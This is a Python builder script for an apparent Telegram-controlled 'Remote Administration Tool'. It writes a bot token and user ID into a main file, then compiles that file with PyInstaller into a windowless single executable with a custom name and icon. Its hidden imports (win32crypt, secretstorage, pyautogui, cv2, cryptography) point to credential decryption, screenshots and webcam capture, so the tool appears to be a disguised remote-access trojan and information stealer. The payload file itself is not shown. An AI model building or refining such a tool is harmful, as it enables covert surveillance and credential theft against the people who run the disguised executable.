import os
import re
import subprocess

def update_main_py(bot_token, user_id):
    try:
        with open("tintuon_main.py", "r", encoding="utf-8") as file:
            lines = file.readlines()

        updated_lines = []
        bot_line_found = False

        for line in lines:
            # Update BOT_TOKEN line while preserving comments/formatting
            if line.strip().startswith('BOT_TOKEN ='):
                if '#' in line and not line.strip().startswith('#'):
                    comment = line[line.find('#'):]
                    updated_lines.append(f'BOT_TOKEN = "{bot_token}"  {comment}')
                else:
                    updated_lines.append(f'BOT_TOKEN = "{bot_token}"\n')

            # Update USER_ID line while preserving comments/formatting
            elif line.strip().startswith('USER_ID ='):
                if '#' in line and not line.strip().startswith('#'):
                    comment = line[line.find('#'):]
                    updated_lines.append(f'USER_ID = {user_id}  {comment}')
                else:
                    updated_lines.append(f'USER_ID = {user_id}\n')

            # Keep all other lines exactly as they are
            else:
                # Track if we find the bot initialization line
                if 'bot = telebot.TeleBot(BOT_TOKEN)' in line:
                    bot_line_found = True
                updated_lines.append(line)

        # Verify we found the bot initialization line
        if not bot_line_found:
            print("❌ Warning: Bot initialization line not found in original file")

        with open("tintuon_main.py", "w", encoding="utf-8") as file:
            file.writelines(updated_lines)
        return True

    except Exception as e:
        print(f"❌ Error updating file: {e}")
        return False


def build_executable(icon_path, name_app):  # Added name_app as parameter
    if not icon_path.endswith('.ico'):
        print("❌ Icon must be a .ico file.")
        return False
    if not os.path.exists(icon_path):
        print(f"❌ Icon file not found: {icon_path}")
        return False

    command = [
        "pyinstaller",
        "--onefile",
        "--windowed",
        "--name", name_app,
        "--icon", icon_path,
        "--hidden-import=telebot",
        "--hidden-import=cv2",
        "--hidden-import=numpy",
        "--hidden-import=pyautogui",
        "--hidden-import=PIL",
        "--hidden-import=pycryptodome",
        "--hidden-import=win32crypt",
        "--hidden-import=pycryptodomex",
        "--hidden-import=secretstorage",
        "--hidden-import=cryptography",
        "tintuon_main.py"
    ]

    print("\n🛠️ Building executable with PyInstaller...")
    try:
        subprocess.run(command, check=True)
        print("\n✅ Success! Executable created in the 'dist' folder.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ PyInstaller failed: {e}")
        return False

def main():
    print("\n🔹 Remote Administration Tool Setup 🔹")
    bot_token = input("Enter your Bot Token: ").strip()
    user_id = input("Enter your User ID: ").strip()
    icon_path = input("Enter the path to your .ico file: ").strip()
    name_app = input("Enter the application name: ").strip()

    if update_main_py(bot_token, user_id):
        print("\n✅  successfully!")
    else:
        print("\n❌ Failed to update. Check if the file exists and is accessible.")
        return

    build_executable(icon_path, name_app)  # Pass name_app as argument

if __name__ == "__main__":
    main()
